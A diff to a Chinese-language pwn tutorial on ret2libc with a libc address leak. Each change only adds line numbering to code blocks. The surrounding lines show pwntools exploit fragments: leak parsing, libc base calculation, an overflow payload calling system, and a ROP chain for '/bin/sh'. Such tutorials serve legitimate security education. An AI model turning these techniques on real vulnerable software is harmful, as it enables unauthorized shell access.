@@ -16,7 +16,7 @@ authors: ['default']
 
 LINK
 
-```c:source.c
+```c:source.c showLineNumbers
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -56,7 +56,7 @@ System is at: 0xf7c4f610
 
 其中大部分与我们对 PIE 所做的一样。
 
-```python
+```python showLineNumbers
 from pwn import *
 
 context.log_level = 'debug'
@@ -69,7 +69,7 @@ p = process()
 
 解析 `system` 地址并从中计算 libc 基址（就像我们对 PIE 所做的那样）。
 
-```python
+```python showLineNumbers
 p.recvuntil('at: ')
 system_leak = int(p.recvline(), 16)
 
@@ -79,7 +79,7 @@ log.success(f'LIBC base: {hex(libc.address)}')
 
 现在我们终于可以使用 libc ELF 对象来实现 `ret2libc` 了。
 
-```python
+```python showLineNumbers
 payload = flat(
     'A' * 32,
     libc.sym['system']
@@ -94,7 +94,7 @@ p.interactive()
 
 ### 1x01 最终 Exploit
 
-```python:exp.py
+```python:exp.py showLineNumbers
 from pwn import *
 
 context.log_level = 'debug'
@@ -130,7 +130,7 @@ LINK
 
 ## 0x05 使用 pwntools 优化
 
-```python
+```python showLineNumbers
 payload = flat(
     'A' * 32,
     libc.sym['system']
@@ -143,7 +143,7 @@ p.sendline(payload)
 
 你可以将上面的 payload 写得更加 pwntoolsy。
 
-```python
+```python showLineNumbers
 shell = next(libc.search(b'/bin/sh'))
 
 rop = ROP(libc)
